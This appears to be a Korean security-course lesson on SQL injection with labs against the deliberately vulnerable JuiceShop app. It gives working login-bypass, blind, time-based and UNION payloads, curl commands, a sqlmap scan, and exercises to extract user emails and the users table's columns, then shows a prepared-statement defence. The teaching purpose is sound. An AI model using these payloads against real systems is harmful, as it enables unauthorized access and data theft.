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05: 입력값 검증 (1): SQL Injection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SQL Injection의 원리와 유형을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Blind SQLi, Time-based SQLi, UNION SQLi를 구분할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JuiceShop에서 수동 SQLi 공격을 실습한다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sqlmap을 이용한 자동화 점검을 수행할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SQL Injection 개요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`'` → 기존 문자열 닫기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`OR 1=1` → 항상 참인 조건 추가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`--` → 나머지 쿼리 주석 처리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정상 쿼리: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SELECT * FROM users WHERE email='student@test.com' AND password='Test1234!'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공격 쿼리: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SELECT * FROM users WHERE email='' OR 1=1--' AND password='아무거나'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             ^^^^^^^^^^^^^^^^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             삽입된 공격 코드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JuiceShop 로그인 SQLi 실습 (30분)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정상 로그인 시도 (실패)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http://10.20.30.80:3000/rest/user/login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'{"email":"admin@juice-sh.op","password":"wrongpassword"}'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SQLi 공격: ' OR 1=1-- 을 이메일에 삽입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http://10.20.30.80:3000/rest/user/login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'{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2&gt;/dev/null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JSON 이스케이프 버전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http://10.20.30.80:3000/rest/user/login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Blind SQL Injection (30분)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첫 번째 글자가 'a'인지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' OR SUBSTRING(password,1,1)='a'--   → 응답 A (참)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' OR SUBSTRING(password,1,1)='b'--   → 응답 B (거짓)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Time-based Blind SQLi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-- SQLite: CASE WHEN 조건 THEN ... (SQLite에서는 직접적 sleep 없음)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-- MySQL:  IF(조건, SLEEP(3), 0)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-- MSSQL:  IF 조건 WAITFOR DELAY '0:0:3'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UNION-based SQLi (30분)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-- 원래 쿼리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SELECT id, name, price FROM products WHERE name LIKE '%apple%'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-- UNION 공격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SELECT id, name, price FROM products WHERE name LIKE '%test%'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UNION SELECT 1, sql, 3 FROM sqlite_master--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sqlmap 자동화 (30분)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검색 API에 대한 sqlmap 실행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sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test"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--batch --level=2 --risk=1 --threads=4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--technique=BEU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--timeout=10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옵션 설명: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--batch: 모든 질문에 기본값 자동 응답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--level=2: 점검 강도 (1~5, 높을수록 많은 페이로드)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--risk=1: 위험도 (1~3, 높을수록 위험한 페이로드)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--threads=4: 동시 요청 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--technique=BEU: Boolean, Error, Union 기법만 사용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7. SQL Injection 방어 방법 (10분)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취약한 코드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query = f"SELECT * FROM users WHERE email='{email}'"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안전한 코드 (Prepared Statement)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cursor.execute("SELECT * FROM users WHERE email=?", (email,))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8. 실습 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JuiceShop 로그인 API에서 SQLi로 admin 계정에 로그인하라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검색 API에서 UNION SELECT로 Users 테이블의 이메일 목록을 추출하라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각 공격에 사용한 페이로드를 기록하라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sqlmap으로 JuiceShop의 검색 API를 스캔하라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발견된 취약점의 유형과 위험도를 정리하라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Users 테이블의 구조(컬럼)를 추출하라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8. 실습 과제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JuiceShop에서 SQLi가 가능한 이유를 코드 관점에서 추론하라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이 취약점을 방어하려면 어떤 수정이 필요한지 서술하라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9.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Classic | ' OR 1=1-- | 응답에 추가 데이터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UNION | UNION SELECT ... | 응답에 다른 테이블 데이터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Blind (Boolean) | AND SUBSTR(...)='a' | 응답 차이 (참/거짓)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Time-based | SLEEP(3) / 무거운 연산 | 응답 시간 차이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Error-based | 문법 오류 유발 | 에러 메시지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